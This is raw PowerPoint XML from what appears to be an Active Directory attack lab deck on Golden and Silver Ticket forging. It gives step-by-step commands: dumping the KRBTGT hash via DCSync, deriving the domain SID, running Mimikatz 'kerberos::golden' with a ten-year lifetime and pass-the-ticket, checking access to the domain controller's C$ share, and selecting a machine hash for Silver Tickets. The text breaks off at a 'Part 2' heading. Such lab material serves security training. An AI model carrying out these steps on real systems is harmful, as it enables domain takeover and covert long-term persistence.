              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="230696487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en-US" dirty="0"/>
              <a:t>● </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Task 03: The Golden &amp; Silver Ticket Attacks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325563"/>
            <a:ext cx="121920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/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Description</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>: Forge Kerberos tickets to gain permanent, undetected access to services and the entire Domain. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Technical Requirements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1371600" lvl="3" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Golden Ticket</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>: Extract the KRBTGT account hash using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>). Use this hash to forge a TGT that gives you Domain Admin rights for 10 years. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1371600" lvl="3" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Silver Ticket</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>: Forge a TGS ticket for a specific service (like CIFS or HTTP) to access a specific server without touching the Domain Controller.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1371600" lvl="3" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Tooling</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>: Practice using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> (command: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>kerberos</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>::golden) or Rubeus. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Learning Goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>: Understand the “Legend Mode" of AD Hacking and why protecting the KRBTGT account is the #1 priority for Blue Teams</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="330305727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" y="0"/>
            <a:ext cx="6096000" cy="6858000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1700" dirty="0"/>
              <a:t>Part 1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Golden Ticket</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>: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700" dirty="0"/>
              <a:t>Extract the KRBTGT account hash using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>).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700" dirty="0"/>
              <a:t>Use this hash to forge a TGT that gives you Domain Admin rights for 10 years.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700" dirty="0"/>
              <a:t>Step 1 — What you already did (IMPORTANT)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700" dirty="0"/>
              <a:t>Before Golden Ticket, you already achieved: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700" dirty="0"/>
              <a:t>👉 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> → extracted KRBTGT hash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700" dirty="0"/>
              <a:t>From earlier step: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700" dirty="0"/>
              <a:t>Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> OR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Impacket</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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700" dirty="0"/>
              <a:t>💥 You should already have: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700" dirty="0"/>
              <a:t>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:NTLM_HASH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700" dirty="0"/>
              <a:t>👉 THIS is the most important secret in the domain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BB2B4AF-4B54-233E-FA29-EBBF9437936F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5950974" y="0"/>
            <a:ext cx="6120580" cy="3791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dirty="0"/>
              <a:t>Step 2 —Get Domain SID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dirty="0"/>
              <a:t> What is Golden Ticket (REAL meaning)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dirty="0"/>
              <a:t>👉 You are NOT “stealing access”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dirty="0"/>
              <a:t>👉 You are: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dirty="0"/>
              <a:t>Creating your own Kerberos ticket signed with KRBTGT hash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dirty="0"/>
              <a:t>Why this works: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dirty="0"/>
              <a:t>Domain Controllers trust anything signed with KRBTGT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dirty="0"/>
              <a:t>You now have that key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dirty="0"/>
              <a:t>So you can forge authentication</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="152083935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12192000" cy="7025268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1700" dirty="0"/>
              <a:t>📍 WHERE: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700" dirty="0"/>
              <a:t>👉 Windows victim shell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700" dirty="0"/>
              <a:t>Command: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700" dirty="0" err="1"/>
              <a:t>whoami</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> /user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700" dirty="0"/>
              <a:t>Output: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700" dirty="0"/>
              <a:t>S-1-5-21-1111111111-2222222222-3333333333-1105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700" dirty="0"/>
              <a:t>👉 Remove last part (-1105)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700" dirty="0"/>
              <a:t>✔ Domain SID becomes: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700" dirty="0"/>
              <a:t>S-1-5-21-1111111111-2222222222-3333333333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700" dirty="0"/>
              <a:t>STEP 3 — Run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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700" dirty="0"/>
              <a:t>👉 Tool: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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700" dirty="0"/>
              <a:t>📍 WHERE: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700" dirty="0"/>
              <a:t>👉 Windows victim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700" dirty="0"/>
              <a:t>Run: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700" dirty="0"/>
              <a:t>mimikatz.exe</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32898360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11353800" cy="71247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700" dirty="0"/>
              <a:t>STEP 4 — Create Golden Ticket in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Command:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>kerberos</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>::golden /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>domain:corp.local</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> /sid:S-1-5-21-1111111111-2222222222-3333333333 /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>krbtgt:NTLM_HASH</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>user:Administrator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> /id:500 /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>ptt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>kerberos</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>::golden </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>domain:corp.local</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>/sid:S-1-5-21-... </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>krbtgt:HASH</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>user:Administrator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>/id:500 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>/start:&lt;current-time&gt; </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>/end:&lt;current-time + long duration&gt; [⛔ THIS IS WHERE LIFETIME IS SET] </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>ptt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="243392645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"/>
            <a:ext cx="11955966" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:norm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700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>What YOU must do for “10 years”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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Replace this part:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Arial Unicode MS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700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>&lt;current-time + long duration&gt;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700" dirty="0"/>
              <a:t>👉 with:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Arial Unicode MS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700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>now + 10 years</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>🔍 Replace:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>corp.local</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> → your domain</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>SID → from Step 2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>NTLM_HASH → KRBTGT hash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>💥 What /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>ptt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> does:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 Pass-The-Ticket</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 Injects ticket directly into memory</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="371565648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11353800" cy="68580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000" dirty="0"/>
              <a:t>STEP 5 — Verify it worked</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>📍 WHERE:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>👉 Same Windows shell</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Check:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> \\DC\c$</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>OR:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>net use \\DC\c$</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>💥 If it works:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>👉 You now have:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>✔ Domain Admin access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>✔ No password used</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> WHAT JUST HAPPENED</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>KRBTGT hash → forged TGT → injected ticket → domain trusts you</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>💀 RESULT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>You are now:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Domain Admin (without credentials)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>👉 You inject the ticket into memory</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="61733936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7506930" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Then:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>ANY system trusts you as Domain Admin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>💀 Result</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>You now have:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>✔ Domain Admin access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>✔ No password needed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>✔ Works offline (no DC contact needed)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>✔ Persistence</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Method 1 — If you used </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> already (MOST COMMON)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>👉 You already dumped domain hashes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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C11D6D2-81A9-5F98-4BC3-237201AF291B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7506930" y="407363"/>
            <a:ext cx="6142702" cy="5689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70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>📍 WHERE:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>👉 Kali OR Windows (where you ran dump)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>💥 Look inside output:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>You’ll see lines like:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Administrator:500:HASH</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>krbtgt:502:HASH</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>FILESERVER$:1001:HASH</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>👉 THIS is what you want:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>FILESERVER$:NTLM_HASH</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc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66355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9696450" cy="6858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700" dirty="0"/>
              <a:t>Part 2 </a:t>
            </a:r>
            <a:r>
